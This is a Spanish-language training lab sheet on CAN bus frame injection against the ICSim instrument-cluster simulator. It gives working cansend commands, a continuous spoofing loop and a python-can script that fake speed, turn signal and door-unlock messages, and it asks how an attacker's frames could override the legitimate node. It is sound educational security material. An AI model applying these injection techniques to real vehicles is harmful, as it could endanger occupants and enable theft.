# Práctica B — Inyección de frames CAN

[Bertsioa euskaraz](05_Practica_B_Inyeccion_eu.md)

**Duración estimada:** 40 minutos  
**Dificultad:** Media  
**Herramientas:** `cansend`, `python-can`

---

## Objetivo

Demostrar que cualquier nodo en el bus CAN puede enviar tramas con cualquier Arbitration ID sin ninguna verificación de origen. Usar el conocimiento de la Práctica A para **tomar control** del cuadro de mandos (ICSim) sin usar el mando legítimo (`controls`).

---

## Contexto

La inyección de frames CAN es el ataque más directo sobre el protocolo. Dado que:
- Todos los nodos reciben todos los mensajes.
- No hay campo de "origen" en la trama CAN.
- No hay autenticación.

...cualquier dispositivo conectado al bus puede enviar tramas que serán procesadas por los receptores como si fueran legítimas.

En investigaciones reales se han demostrado ataques de inyección que:
- Desactivan el ABS a 100 km/h (Miller & Valasek, 2015 — Jeep Cherokee).
- Abren puertas mientras el vehículo circula.
- Muestran velocidades falsas en el cuadro de instrumentos.

---

## Prerrequisitos

- Práctica A completada (conocer los IDs y bytes relevantes).
- `vcan0` activa.
- ICSim corriendo (sin `controls` — la inyección reemplaza el mando).

---

## Ejercicio B.1 — Inyección básica con `cansend`

### Formato de cansend

```
cansend <interfaz> <ID>#<datos_hex>
```

Los datos son pares de bytes hexadecimales. 8 bytes = 16 caracteres hex.

### Controlar la velocidad

```bash
# Velocidad 0 (reposo)
cansend vcan0 244#0000000000000000

# Velocidad media (~128/255)
cansend vcan0 244#0000000080000000

# Velocidad máxima (255/255)
cansend vcan0 244#00000000FF000000
```

Observar el velocímetro de ICSim subir y bajar.

### Controlar los intermitentes

```bash
# Sin intermitentes
cansend vcan0 188#0000000000000000

# Intermitente izquierdo
cansend vcan0 188#0100000000000000

# Intermitente derecho
cansend vcan0 188#0200000000000000

# Ambos intermitentes (luces de emergencia)
cansend vcan0 188#0300000000000000
```

### Controlar las puertas

```bash
# Todas las puertas bloqueadas (0x0F en byte 0 = bits 0-3 a 1)
cansend vcan0 19B#0F00000000000000

# Todas las puertas desbloqueadas
cansend vcan0 19B#0000000000000000

# Solo puerta 1 desbloqueada (bit 0 = 1)
cansend vcan0 19B#0100000000000000

# Solo puertas 1 y 3 desbloqueadas (bits 0 y 2 = 1)
cansend vcan0 19B#0500000000000000
```

---

## Ejercicio B.2 — Ataque de suplantación continua

Un único `cansend` envía solo una trama. Para **mantener** un valor en el cuadro de mandos (que normalmente se actualiza a ~60 Hz), hay que enviar de forma continua.

### Bucle de inyección con shell

```bash
# Mantener velocímetro al máximo mientras ICSim usa su frecuencia normal
while true; do
    cansend vcan0 244#00000000FF000000
    sleep 0.016  # ~60 Hz
done
```

Ejecutar en un terminal y observar que el velocímetro se queda fijo al máximo aunque no se pulse ninguna tecla en `controls`.

### Cancelar

```bash
Ctrl+C
```

---

## Ejercicio B.3 — Inyección desde Python con `python-can`

El script Python permite mayor control (timing, patrones, logging).

```bash
source .venv/bin/activate
```

```python
# Ejecutar en Python REPL o como script
import can
import time

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')

# Subir velocímetro de 0 a máximo en rampa
for speed in range(0, 256, 5):
    data = [0x00, 0x00, 0x00, 0x00, speed, 0x00, 0x00, 0x00]
    msg = can.Message(arbitration_id=0x244, data=data, is_extended_id=False)
    bus.send(msg)
    time.sleep(0.05)
    print(f"Velocidad: {speed}/255 → {speed * 100 // 255} km/h equiv.")

bus.shutdown()
```

Guardar como `scripts/rampa_velocidad.py` y ejecutar:
```bash
python scripts/rampa_velocidad.py
```

Observar el velocímetro subir suavemente de 0 al máximo.

---

## Ejercicio B.4 — Reto: secuencia de acción compuesta

Objetivo: crear una secuencia de comandos que simule la siguiente situación **sin tocar `controls`**:

1. El vehículo frena (velocidad baja de máximo a 0 en 3 segundos).
2. Se activan las luces de emergencia (ambos intermitentes).
3. Las 4 puertas se desbloquean.

```bash
# Pista: combinar bucles y cansend con sleep
# Completar el script por el equipo
```

Entregar el script completado como evidencia.

---

## Ejercicio B.5 — Conflicto de nodos (inyección vs. controls)

Ejecutar `controls` **y** el bucle de inyección de velocidad **al mismo tiempo**.

```bash
# Terminal 1: controls normales
./ICSim/builddir/controls vcan0

# Terminal 2: inyección de velocidad máxima
while true; do cansend vcan0 244#00000000FF000000; sleep 0.016; done
```

### Preguntas

- ¿Qué muestra el velocímetro? ¿Gana la inyección o el control legítimo?
- ¿Por qué? (Pista: frecuencia de envío y arbitraje CAN)
- ¿Cómo podría un atacante asegurarse de que sus tramas "ganen" al nodo legítimo?

---

## Entregables de la Práctica B

1. Captura de pantalla de ICSim con velocímetro al máximo provocado por inyección.
2. Captura de pantalla de ICSim con ambos intermitentes activos por inyección.
3. Script de la secuencia compuesta (Ejercicio B.4).
4. Respuestas a las preguntas del Ejercicio B.5.

---

## Reflexión final

- ¿Qué diferencia hay entre este ataque y el ataque a un sistema IP normal?
- ¿Por qué es difícil implementar autenticación en CAN bus en tiempo real?
- ¿Conoces alguna propuesta de estándar para añadir seguridad a CAN? (Pista: CAN-SEC, CANAuth, AUTOSAR SecOC)
